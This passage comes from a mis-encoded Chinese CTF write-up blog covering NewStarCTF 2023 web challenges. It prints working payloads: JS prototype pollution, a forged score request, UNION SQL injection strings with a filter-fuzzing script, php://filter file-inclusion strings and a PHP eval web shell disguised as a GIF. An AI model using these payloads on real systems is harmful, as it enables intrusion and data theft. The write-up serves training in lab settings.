å®¡è®¡æˆ‘ä»¬éœ€è¦æŸ¥çœ‹config.jsæ–‡ä»¶å’Œconfig.default.jsæ–‡ä»¶ä¸­çš„æœ€å°æ—¶é—´ä¿¡æ¯:</p><p>config.js:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>    <span class="hljs-attr">app_name</span>: <span class="hljs-string">&quot;OtenkiGirl&quot;</span>,<br>    <span class="hljs-attr">default_lang</span>: <span class="hljs-string">&quot;ja&quot;</span>,<br>&#125;<br></code></pre></td></tr></table></figure><p>config.default.js:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>    <span class="hljs-attr">app_name</span>: <span class="hljs-string">&quot;OtenkiGirl&quot;</span>,<br>    <span class="hljs-attr">default_lang</span>: <span class="hljs-string">&quot;ja&quot;</span>,<br>    <span class="hljs-comment">//è®¾ç½®äº†min_public_timeå‚æ•°çš„å†…å®¹</span><br>    <span class="hljs-attr">min_public_time</span>: <span class="hljs-string">&quot;2019-07-09&quot;</span>,<br>    <span class="hljs-attr">server_port</span>: <span class="hljs-number">9960</span>,<br>    <span class="hljs-attr">webpack_dev_port</span>: <span class="hljs-number">9970</span><br>&#125;<br></code></pre></td></tr></table></figure><p>å‘ç°åªæœ‰config.default.jsè®¾ç½®äº†min_public_timeå‚æ•°çš„å†…å®¹ï¼Œæ‰€ä»¥dateç±»ç”³è¯·æ—¶ä½¿ç”¨äº†config.default.jsä¸­çš„min_public_time: â€œ2019-07-09â€</p><p>åŒæ—¶æ ¹æ®åˆ†æinfo.jsæˆ‘ä»¬å¯ä»¥çŸ¥é“æˆ‘ä»¬è¾“å…¥çš„å‚æ•°tså¯ä»¥æ—¶ä»»æ„çš„ï¼Œç”¨äºè·å–æŒ‡å®šæ—¶é—´æˆ³çš„ä¿¡æ¯:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">/info/1<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231028170204727.png" alt="image-20231028170204727"></p><p>æˆ‘ä»¬å‘ç°è¿”å›çš„å†…å®¹æ˜¯æ—¶é—´æˆ³â€timestampâ€:1698483502171çš„å†…å®¹ï¼Œè¿™æ˜¯å› ä¸ºæˆ‘ä»¬è¾“å…¥çš„æ—¶é—´æˆ³ts&#x3D;1&lt;1698483502171ï¼ˆmin_public_time: â€œ2019-07-09â€ï¼‰æ‰€ä»¥è¿”å›çš„æ˜¯ç³»ç»Ÿé»˜è®¤æ—¶é—´ä¹‹ä¸Šçš„ä¿¡æ¯</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">/info/1698483502172<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231028170420211.png" alt="image-20231028170420211"></p><p>å‘ç°æ²¡æœ‰dataæ•°æ®è¿”å›ï¼Œè¿™æ˜¯å› ä¸ºæˆ‘ä»¬è¾“å…¥çš„æ—¶é—´æˆ³tså·²ç»å¤§äºç³»ç»Ÿé»˜è®¤çš„æ—¶é—´æˆ³ï¼Œæ‰€ä»¥è¿”å›æˆ‘ä»¬tsä¹‹ä¸Šçš„dataæ•°æ®è®°å½•</p><p>çŒœæµ‹:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">å½“å‰æ•°æ®åº“è¿”å›çš„å†…å®¹æ˜¯åœ¨ç³»ç»Ÿé…ç½®çš„é»˜è®¤æ—¶é—´ä¹‹ä¸Šçš„ä¿¡æ¯ï¼Œå³ç”±äºä»£ç çš„æ—¶é—´è¿‡æ»¤ï¼Œæœ€å¤šå›æ˜¾é…ç½®æ—¶é—´ä¹‹ä¸Šçš„ä¿¡æ¯ï¼Œæˆ‘ä»¬æ— æ³•æŸ¥çœ‹é…ç½®æ—¶é—´ä¹‹ä¸‹çš„æ•°æ®åº“ä¸­çš„ä¿¡æ¯ï¼Œä¹Ÿè®¸flagå°±åœ¨é…ç½®æ—¶é—´ä¹‹ä¸‹çš„è®°å½•ä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ›´æ”¹é»˜è®¤é…ç½®çš„æ—¶é—´ï¼Œä½¿å…¶å˜å¾—å¾ˆå°ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æŸ¥çœ‹æ•°æ®åº“ä¸­æ›´å¤šçš„ä¿¡æ¯<br></code></pre></td></tr></table></figure><p>jsåŸå‹é“¾æ±¡æŸ“:</p><p>payload:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable constant_">POST</span> /submit <span class="hljs-variable constant_">HTTP</span>/<span class="hljs-number">1.</span>1Content-<span class="hljs-title class_">Type</span>: application/json<br><br>&#123;  <br>    <span class="hljs-string">&quot;contact&quot;</span>: <span class="hljs-string">&quot;test&quot;</span>,  <br>    <span class="hljs-string">&quot;reason&quot;</span>: <span class="hljs-string">&quot;test&quot;</span>,  <br>    <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;    <br>        <span class="hljs-string">&quot;min_public_time&quot;</span>: <span class="hljs-string">&quot;1001-01-01&quot;</span>  <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231028171513867.png" alt="image-20231028171513867"></p><p>è·å–æˆ‘ä»¬ä¿®æ”¹é»˜è®¤é…ç½®æ—¶é—´åæ•°æ®åº“ä¸­çš„ä¿¡æ¯(0æ˜¯æœ€å°çš„æ—¶é—´æˆ³ï¼Œæ‰€ä»¥ä¸€å®šèƒ½è¿”å›â€min_public_timeâ€: â€œ1001-01-01â€ä¹‹ä¸Šæ—¶é—´çš„ä¿¡æ¯):<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">/info/0<br><br>Content-Type:  application/x-www-form-urlencoded<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231028171757647.png" alt="image-20231028171757647"></p><p>è¿”å›äº†æ•°æ®åº“ä¸­æ›´å¤šçš„ä¿¡æ¯ï¼Œåœ¨è¿™äº›é¢å¤–çš„ä¿¡æ¯ä¸­æŸ¥æ‰¾flag:<br><img src="/images/2023-11-3-newstar-3/image-20231028171854336.png" alt="image-20231028171854336"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>NewStarCTF 2023_ç¬¬äºŒå‘¨WP</title>
    <link href="/2023/10/09/2023-10-9-newstarweek2/"/>
    <url>/2023/10/09/2023-10-9-newstarweek2/</url>
    
    <content type="html"><![CDATA[<h1 id="NewStarCTF-2023-ç¬¬äºŒå‘¨WP"><a href="#NewStarCTF-2023-ç¬¬äºŒå‘¨WP" class="headerlink" title="NewStarCTF 2023_ç¬¬äºŒå‘¨WP"></a>NewStarCTF 2023_ç¬¬äºŒå‘¨WP</h1><h2 id="æ¸¸æˆé«˜æ‰‹"><a href="#æ¸¸æˆé«˜æ‰‹" class="headerlink" title="æ¸¸æˆé«˜æ‰‹"></a>æ¸¸æˆé«˜æ‰‹</h2><p><img src="/images/2023-10-9-Newstar-2/image-20231004153201791.png" alt="image-20231004153201791"></p><p>æœ¬é¢˜æ˜¯ä¸€é“æ¸¸æˆé¢˜ï¼ŒæŒ‰ç…§æƒ¯ä¾‹ï¼Œæˆ‘ä»¬éœ€è¦å…ˆæŸ¥çœ‹çš„js:<br><img src="/images/2023-10-9-Newstar-2/image-20231004153237481.png" alt="image-20231004153237481"></p><p>å¾—åˆ°ä¸€ä¸ªapp_v2.jsæ–‡ä»¶ï¼Œä»¥åŠæˆ‘ä»¬éœ€è¦è·å¾—100000åˆ†æ‰èƒ½æ˜¾ç¤ºflag</p><p>è®¿é—®app_v2.jsæ–‡ä»¶,æˆ‘ä»¬ç›´æ¥å®šä½åˆ°æ¸¸æˆç»“æŸæ—¶çš„å¤„ç†ä»£ç :<br><img src="/images/2023-10-9-Newstar-2/image-20231004153442164.png" alt="image-20231004153442164"></p><p>æ˜¾ç¤ºä¸€ä¸ªalertæç¤ºæ¡†ï¼Œä½¿ç”¨ctrl+få¯»æ‰¾è¯¥æç¤ºæ¡†çš„å…·ä½“ä½ç½®:<br><img src="/images/2023-10-9-Newstar-2/image-20231004153543915.png" alt="image-20231004153543915"></p><p>åœ¨è¯¥ä»£ç ä¸­æˆ‘ä»¬å‘ç°äº†api.phpæ–‡ä»¶ï¼Œå¯¹å…¶è¿›è¡Œè®¿é—®:</p><p><img src="/images/2023-10-9-Newstar-2/image-20231004153645105.png" alt="image-20231004153645105"></p><p>å¯¹jsä»£ç è¿›è¡Œä»£ç å®¡è®¡:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//æ¸¸æˆç»“æŸ</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">gameover</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">if</span>(gameScore &gt; <span class="hljs-number">100000</span>)&#123;<br>        <span class="hljs-comment">//åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„XMLHttpRequestå¯¹è±¡ã€‚XMLHttpRequestå¯¹è±¡æ˜¯ç”¨äºåœ¨åå°ä¸æœåŠ¡å™¨äº¤æ¢æ•°æ®çš„JavaScript APIã€‚å®ƒå¯ä»¥é€šè¿‡HTTPæˆ–HTTPSåè®®å‘é€HTTPè¯·æ±‚ï¼Œå¹¶æ¥æ”¶æœåŠ¡å™¨çš„å“åº”ã€‚</span><br>        <span class="hljs-keyword">var</span> xhr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>        <span class="hljs-comment">//ä½¿ç”¨postè¯·æ±‚æ‰“å¼€ä¸€ä¸ªapi.phpæ–‡ä»¶ï¼Œå¹¶å½¢æˆç½‘é¡µå¯¹è±¡å­˜å‚¨åˆ°xhrä¸­</span><br>        xhr.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;POST&quot;</span>, <span class="hljs-string">&quot;/api.php&quot;</span>, <span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//xhrç½‘é¡µå»ºç«‹ä¸€ä¸ªç½‘é¡µè¯·æ±‚å¤´Content-Typeï¼Œå†…å®¹ä¸ºapplication/json</span><br>        xhr.<span class="hljs-title function_">setRequestHeader</span>(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;application/json&quot;</span>);<br>        xhr.<span class="hljs-property">onreadystatechange</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">if</span> (xhr.<span class="hljs-property">readyState</span> === <span class="hljs-number">4</span> &amp;&amp; xhr.<span class="hljs-property">status</span> === <span class="hljs-number">200</span>) &#123;<br>            <span class="hljs-keyword">var</span> response = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(xhr.<span class="hljs-property">responseText</span>);<br>            <span class="hljs-title function_">alert</span>(response.<span class="hljs-property">message</span>);<br>        &#125;<br>        &#125;;<br>        <span class="hljs-comment">//åˆ›å»ºä¸€ä¸ªjsonæ•°æ®å¯¹è±¡</span><br>        <span class="hljs-keyword">var</span> data = &#123;<br>            <span class="hljs-comment">//scoreæ˜¯é”®ï¼ŒgameScoreæ˜¯value</span><br>            <span class="hljs-attr">score</span>: gameScore,<br>        &#125;;<br>        <span class="hljs-comment">//å°†jsonæ•°æ®ä¼ è¾“ç»™xhrç½‘é¡µå¯¹è±¡</span><br>        xhr.<span class="hljs-title function_">send</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data));<br>    &#125;<br><span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;æˆç»©ï¼š&quot;</span>+gameScore);<br>gameScore=<span class="hljs-number">0</span>;  <br>curPhase =<span class="hljs-variable constant_">PHASE_READY</span>;  <br>hero = <span class="hljs-literal">null</span>;<br>hero = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hero</span>();      <br>&#125;<br></code></pre></td></tr></table></figure><p>æ ¹æ®ä»£ç å®¡è®¡æˆ‘ä»¬éœ€è¦ä¼ è¾“ä¸€ä¸ªjsonæ•°æ®ç»™ç½‘é¡µï¼Œè¿™ä¸ªjsonæ•°æ®å°±æ˜¯æˆ‘ä»¬æ¸¸æˆçš„åˆ†æ•°ï¼Œä½¿ç”¨bpæŠ“åŒ…ï¼Œåœ¨api.phpæ‰€åœ¨ç½‘é¡µä¼ è¾“ä¸€ä¸ªjsonæ•°æ®:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs txt">Content-Type:application/json<br><br>&#123;<br>   &quot;score&quot;:100000000000<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004154912262.png" alt="image-20231004154912262"></p><h2 id="ez-sql"><a href="#ez-sql" class="headerlink" title="ez_sql"></a>ez_sql</h2><p><img src="/images/2023-10-9-Newstar-2/image-20231004155124328.png" alt="image-20231004155124328"></p><p>æˆ‘ä»¬åœ¨urlä¸­å‘ç°å­˜åœ¨sqlæ³¨å…¥ç‚¹:<br><img src="/images/2023-10-9-Newstar-2/image-20231004155156692.png" alt="image-20231004155156692"></p><p>çŒœæµ‹å¯èƒ½æ˜¯é€šè¿‡idåœ¨æ•°æ®åº“ä¸­å¯»æ‰¾å­˜åœ¨çš„è®°å½•ç„¶åå›æ˜¾åˆ°é¡µé¢:<br>æµ‹è¯•è¯¥ç½‘é¡µæ˜¯å¦å­˜åœ¨sqlæŠ¥é”™:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=TMP0919&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004155327273.png" alt="image-20231004155327273"></p><p>å‘ç°ç½‘é¡µä¸ä¼šå›æ˜¾æŠ¥é”™ä¿¡æ¯ï¼Œä½†æ˜¯ä¼šå›æ˜¾æ•°æ®åº“ä¸­æœç´¢åˆ°ï¼Œå¹¶è¿”å›çš„ç»“æœé›†ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è¯•è¯•ä¸€ä¸‹unionæ³¨å…¥æ³•:</p><p>ç¬¬ä¸€æ­¥ï¼šç”±äºunionæ³¨å…¥éœ€è¦ç¡®åˆ‡çŸ¥é“selectè¿”å›çš„å­—æ®µæ•°ï¼Œæ‰€ä»¥éœ€è¦å…ˆçˆ†æ•°æ®åº“çš„å­—æ®µ:</p><p>payload(order by,group by,union select 1,2,3,â€¦.):</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=-1&#x27;union select 1 -- &#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004160721249.png" alt="image-20231004160721249"></p><p>å‘ç°æœ‰è¿‡æ»¤,ä½¿ç”¨è„šæœ¬æ‰«ä¸€ä¸‹æœ‰å“ªäº›å…³é”®è¯è¿‡æ»¤:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-comment"># æ‰“å¼€è¯»å–SQL_fuzzæ–‡ä»¶</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;SQL_fuzz.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    contents = f.readlines()<br>    <span class="hljs-comment"># print(contents)</span><br><span class="hljs-comment"># åˆ é™¤è¯»å–æ•°æ®ä¸­çš„&#x27;\n&#x27;</span><br>data_list = []<br><span class="hljs-keyword">for</span> msg <span class="hljs-keyword">in</span> contents:<br>    msg = msg.strip(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <span class="hljs-comment"># # å­—ç¬¦ä¸²æ ¹æ®ç©ºæ ¼è¿›è¡Œåˆ†å‰²</span><br>    <span class="hljs-comment"># d = msg.split(&#x27; &#x27;)</span><br>    data_list.append(msg)<br>f.close<br><span class="hljs-comment"># print(data_list)</span><br><br>black_list=[]<br><br><span class="hljs-comment"># è¿›è¡Œfuzzæ³¨å…¥</span><br>url = <span class="hljs-string">&quot;http://64a5def2-4e23-45a6-a6e6-22ec898fc9f2.node4.buuoj.cn:81/?id=&quot;</span><br><span class="hljs-comment"># GETè¯·æ±‚</span><br><span class="hljs-keyword">for</span> data <span class="hljs-keyword">in</span> data_list:<br>    da = data<br>    <span class="hljs-comment"># da = &quot;1 &#123;&#125;&quot;.format(data)</span><br>    <span class="hljs-comment"># da = &quot;1&#123;&#125;&quot;.format(data)</span><br>    da = <span class="hljs-string">&quot;1&#x27;&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(data)<br>    r = requests.get(url+da)<br>    <span class="hljs-comment"># ä½¿ç”¨timeä½¿è¯·æ±‚èƒ½å¤Ÿæ‹¥æœ‰è¶³å¤Ÿçš„æ—¶é—´å»å“åº”</span><br>    time.sleep(<span class="hljs-number">0.04</span>)<br>    <span class="hljs-comment"># è·å–è¿‡æ»¤ç½‘ç«™å“åº”ä¿¡æ¯</span><br>    reponse_txt = <span class="hljs-string">&quot;no!&quot;</span><br>    <span class="hljs-keyword">if</span> (reponse_txt <span class="hljs-keyword">in</span> r.text):<br>        black_list.append(data)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;è¯¥ç½‘ç«™è¿‡æ»¤äº†&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(data))<br><br><span class="hljs-comment"># POSTè¯·æ±‚</span><br><span class="hljs-comment"># for d in data_list:</span><br><span class="hljs-comment">#     # da = d</span><br><span class="hljs-comment">#     # da = &quot;1 &#123;&#125;&quot;.format(d)</span><br><span class="hljs-comment">#     da = d</span><br><span class="hljs-comment">#     # POSTä¼ è¾“jsonæ•°æ®</span><br><span class="hljs-comment">#     payload = &#123;</span><br><span class="hljs-comment">#         &quot;query&quot;:da</span><br><span class="hljs-comment">#     &#125;</span><br><span class="hljs-comment">#     r = requests.post(url=url, data=payload)</span><br><span class="hljs-comment">#     time.sleep(0.04)</span><br><span class="hljs-comment">#     reponse_txt = &quot;Nonono&quot;</span><br><span class="hljs-comment">#     # print(r.text)</span><br><span class="hljs-comment">#     if (reponse_txt in r.text):</span><br><span class="hljs-comment">#         black_list.append(d)</span><br><span class="hljs-comment">#         print(&quot;è¯¥ç½‘ç«™è¿‡æ»¤äº†&#123;&#125;&quot;.format(d))</span><br><br><br><span class="hljs-built_in">print</span>(black_list)<br></code></pre></td></tr></table></figure><p>è¾“å‡º:</p><p><img src="/images/2023-10-9-Newstar-2/image-20231004162813880.png" alt="image-20231004162813880"></p><p>æˆ‘ä»¬å…ˆå°è¯•ä½¿ç”¨å¤§å°å†™ç»•è¿‡æ³•:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=-1&#x27;Union Select 1 -- &#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004160824030.png" alt="image-20231004160824030"></p><p>å‘ç°ç»•è¿‡ï¼ï¼ï¼</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=-1&#x27;Union Select 1,2,3,4,5 -- &#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004160937013.png" alt="image-20231004160937013"></p><p>å‘ç°å›æ˜¾å†…å®¹ï¼Œæ‰€ä»¥å¯ä»¥ç¡®å®šselectè¿”å›ç»“æœé›†çš„å­—æ®µä¸ªæ•°ä¸º5</p><p>ç¬¬äºŒæ­¥ï¼šçˆ†æ•°æ®åº“</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=-1&#x27;Union Select 1,database(),3,4,5 -- &#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004163106775.png" alt="image-20231004163106775"></p><p>å¾—åˆ°æ•°æ®åº“:ctf</p><p>ç¬¬ä¸‰æ­¥ï¼šçˆ†è¡¨:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">å¸¸è§„:<br>?id=-1&#x27;Union Select 1,Group_concat(table_name),3,4,5 from infOrmation_schema.tables Where table_schema= DATABASE(); -- &#x27;<br>æš´åŠ›æ–¹å¼:<br>?id=-1&#x27;Union Select 1,Group_concat(table_name),3,4,5 from infOrmation_schema.tables -- &#x27;<br></code></pre></td></tr></table></figure><p>å¸¸è§„:</p><p><img src="/images/2023-10-9-Newstar-2/image-20231004164025606.png" alt="image-20231004164025606"></p><p>æš´åŠ›:</p><p><img src="/images/2023-10-9-Newstar-2/image-20231004164224393.png" alt="image-20231004164224393"></p><p>æœ€ç»ˆæˆ‘ä»¬å‘ç°ä¸€ä¸ªå…³é”®çš„è¡¨:here_is_flag</p><p>ç¬¬å››æ­¥ï¼šçˆ†è¡¨çš„å­—æ®µ:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=-1&#x27;Union Select 1,Group_concat(column_name),3,4,5 from infOrmation_schema.COLUMNS Where table_schema = &#x27;ctf&#x27; And table_name = &#x27;here_is_flag&#x27;; -- &#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004170217827.png" alt="image-20231004170217827"></p><p>å¾—åˆ°å­—æ®µflag</p><p>ç¬¬äº”æ­¥ï¼šçˆ†å­—æ®µçš„å€¼:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=1&#x27;union Select 1,Group_concat(flag),3,4,5 from here_is_flag -- &#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004170857984.png" alt="image-20231004170857984"></p><p>è·å¾—flag</p><h2 id="include-0ã€‚0"><a href="#include-0ã€‚0" class="headerlink" title="include 0ã€‚0"></a>include 0ã€‚0</h2><p>ä»£ç å®¡è®¡:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// FLAG in the flag.php</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-comment">//è¿™é‡Œè¿‡æ»¤äº†baseç¼–ç å’Œrotç¼–ç è·å–æ–‡ä»¶åŒ…å«ä¿¡æ¯</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>) &amp;&amp; !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/base|rot/i&#x27;</span>,<span class="hljs-variable">$file</span>))&#123;<br>    <span class="hljs-comment">//å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´</span><br>    @<span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> nope<br></code></pre></td></tr></table></figure><p>æä¾›æ–‡ä»¶åŒ…å«æ¼æ´çš„payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs txt">php://filter/read=convert.quoted-printable-encode/resource=flag.php<br>php://filter/read=convert.url-encode/resource=flag.php<br>php://filter/read=convert.base64-decode/resource=flag.php<br>php://filter/read=convert.base64url-decode/resource=flag.php<br>php://filter/read=convert.rot13/resource=flag.php<br>php://filter/read=convert.hex/resource=flag.php<br>php://filter/read=convert.iconv.utf-8.utf-16/resource=flag.php<br>php://filter/read=convert.iconv.utf-8.utf-32/resource=flag.php<br>php://filter/read=convert.quoted-printable-decode/resource=flag.php<br>php://filter/read=convert.base64url-encode/resource=flag.php<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">php://filter/read=convert.iconv.utf-8.utf-32/resource=flag.php<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004171344082.png" alt="image-20231004171344082"></p><h2 id="Upload-again"><a href="#Upload-again" class="headerlink" title="Upload again!"></a>Upload again!</h2><p><img src="/images/2023-10-9-Newstar-2/image-20231004171830952.png" alt="image-20231004171830952"></p><p>è¿™æ˜¯ä¸€é“æ–‡ä»¶ä¸Šä¼ é¢˜ï¼Œæˆ‘ä»¬å…ˆä¸Šä¼ ä¸€ä¸ªphpæ–‡ä»¶å¹¶æŠ“åŒ…ä¸€ä¸‹:</p><p><img src="/images/2023-10-9-Newstar-2/image-20231004172115084.png" alt="image-20231004172115084"></p><p>å‘ç°bpæ²¡æœ‰å“åº”ï¼Œå‰ç«¯ç›´æ¥è¿”å›åˆ¤æ–­ä¿¡æ¯ï¼Œè¦ä½¿bpèƒ½å¤ŸæŠ“å–ä¿¡æ¯ï¼Œå¯ä»¥åœ¨æµè§ˆå™¨ä¸­å…³é—­å‰ç«¯js</p><p>è¿™é‡Œå·æ‡’ç›´æ¥ä¸Šä¼ äº†ç”¨jså†™çš„phpæ–‡ä»¶çš„å›¾ç‰‡å½¢å¼:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title class_">GIF89</span>a<br>&lt;script language=<span class="hljs-string">&quot;php&quot;</span>&gt;@<span class="hljs-built_in">eval</span>($_POST[<span class="hljs-string">&#x27;pass&#x27;</span>]);&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><img 